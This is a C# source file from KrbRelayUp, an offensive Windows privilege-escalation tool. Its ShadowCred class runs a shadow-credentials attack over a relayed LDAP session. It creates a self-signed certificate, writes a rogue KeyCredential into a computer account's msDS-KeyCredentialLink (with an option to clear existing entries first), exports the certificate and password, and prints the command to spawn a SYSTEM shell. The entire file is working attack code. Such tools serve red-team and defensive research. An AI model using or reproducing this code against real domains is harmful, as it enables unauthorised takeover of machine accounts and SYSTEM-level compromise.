using System;
using System.DirectoryServices.Protocols;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using DSInternals.Common.Data;
using static KrbRelayUp.Relay.Natives;

namespace KrbRelayUp.Relay.Attacks.Ldap
{
    class ShadowCred
    {
        public static LdapStatus attack(IntPtr ld)
        {
            string dn = Generic.getMachineDN(ld);
            Console.WriteLine("[+] Generating certificate");
            X509Certificate2 cert = GenerateSelfSignedCert(dn);
            Console.WriteLine("[+] Certificate generated");
            Console.WriteLine("[+] Generating KeyCredential");
            Guid guid = Guid.NewGuid();
            KeyCredential keyCredential = new KeyCredential(cert, guid, dn, DateTime.Now);
            Console.WriteLine("[+] KeyCredential generated with DeviceID {0}", guid.ToString());
            if (Options.shadowCredForce)
            {
                Console.WriteLine("[+] Clearing msDS-KeyCredentialLink before adding our new KeyCredential");
                Generic.clearAttribute(ld, "msDS-KeyCredentialLink", dn);
            }
            LdapStatus ret = Generic.setAttribute(ld, "msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary()), dn);

            if (ret != LdapStatus.LDAP_SUCCESS)
            { 
                if ((!Options.shadowCredForce) && (ret == LdapStatus.LDAP_INSUFFICIENT_ACCESS))
                {
                    Console.WriteLine("[-] Got error 'LDAP_INSUFFICIENT_ACCESS' when trying to add new KeyCredential");
                    Console.WriteLine("    Could be due to an existing KeyCredential in computer object"); 
                    Console.WriteLine("    Try again with '--ForceShadowCred' flag to force overwrite it");
                    Environment.Exit(0);
                }
                return ret;
            }

            Options.shadowCredCertificatePassword = Program.RandomPasswordGenerator(12);
            byte[] certBytes = cert.Export(X509ContentType.Pfx, Options.shadowCredCertificatePassword);
            Options.shadowCredCertificate = Convert.ToBase64String(certBytes);
            Console.WriteLine("[+] KeyCredential added successfully");
            if (Options.phase != Options.PhaseType.Full)
            {
                Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
                Console.WriteLine($"    ./KrbRelayUp.exe spawn -m shadowcred -d {Options.domain} -dc {Options.domainController} -ce {Options.shadowCredCertificate} -cep {Options.shadowCredCertificatePassword}");
            } else
            {
                Console.WriteLine($"[+] Certificate: {Options.shadowCredCertificate}");
                Console.WriteLine($"[+] Certificate Password: {Options.shadowCredCertificatePassword}");
            }

            Options.attackDone = true;
            
            return ret;
        }

        //Code taken from https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c
        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            RSA rsa = new RSACryptoServiceProvider(2048, new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString()));
            CertificateRequest req = new CertificateRequest($"cn={cn}", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

    }
}
